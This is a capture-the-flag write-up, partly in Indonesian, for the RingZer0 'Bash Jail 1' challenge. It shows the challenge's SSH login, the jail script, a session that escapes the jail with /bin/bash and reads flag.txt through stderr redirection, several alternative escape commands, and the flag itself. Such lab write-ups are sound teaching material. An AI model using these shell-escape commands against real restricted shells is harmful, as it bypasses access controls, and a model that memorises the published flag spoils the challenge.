<h1>Bash Jail 1</h1>
<h3>Description</h3>
SSH
<pre>
User : level1 
Pass : level1
Host : challenges.ringzer0ctf.com 
Port : 10218
</pre>
<h3>Solution</h3>

```console
┌──(root㉿Kali)-[/home/venom]
└─# ssh level1@challenges.ringzer0ctf.com -p 10218
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
level1@challenges.ringzer0ctf.com's password: 

RingZer0 Team Online CTF

BASH Jail Level 1:
Current user is uid=2001(level1) gid=2001(level1) groups=2001(level1),1000(challenger)

Flag is located at /home/level1/flag.txt

Challenge bash code:
-----------------------------

echo 
echo "Flag is located at $(pwd)/flag.txt"
echo
echo "Challenge bash code:"
echo "-----------------------------"
echo -e '\033[0;31m'
sed -e '1,19d' < $0
echo -e '\033[0m'
echo "-----------------------------"

# CHALLENGE

while :
do
	echo "Your input:"
	read input
	output=`$input`
done 

-----------------------------
Your input:
/bin/bash
level1@jail-bash:~$ ls
level1@jail-bash:~$ ls -al
level1@jail-bash:~$ ls -al 1>&2
total 28
dr-xr-x--- 2 root level1 4096 Apr 30 10:22 .
drwxr-xr-x 9 root root   4096 May  2  2024 ..
-r-xr-x--- 1 root level1  220 Apr  8  2014 .bash_logout
-r-xr-x--- 1 root level1 3637 Apr  8  2014 .bashrc
-r--r----- 1 root level1   38 Mar 15  2016 flag.txt
-r-xr-x--- 1 root level1  675 Apr  8  2014 .profile
-rwxr-x--- 1 root level1  700 Apr 30 10:22 prompt.sh
level1@jail-bash:~$ cat flag.txt 1>&2
FLAG-U96l4k6m72a051GgE5EN0rA85499172K
level1@jail-bash:~$ 
```
<label>Escaping dengan input /bin/bash untuk memanggil shell karena `...` merupakan command subtitusi cara lama, yang sekarang $($input) merupakan cara modren. Lalu cat file flag.txt dengan stderr, karena stdout tidak ada di bash script</label>
<label>Command lain yang bekerja</label>

```pre
eval cat /home/level1/flag.txt 1>&2				: subtitusi command lalu eval eksekusi cat ke file flag dengan stderr
bash -x *.sh									: eksekusi semua file bash, lalu menampilkan debug/trace termasuk file flag
bash "flag.txt"									: eksekusi file flag.txt menjadi bash, yang otomatis memberikan error command not found, karena flag tidak cocok dengan command
cat /home/level1/flag.txt 1>&0					: eksekusi cat ke file flag.txt dan output ke stdin
```
<h3>Flag</h3>
<pre>
FLAG-U96l4k6m72a051GgE5EN0rA85499172K
</pre>
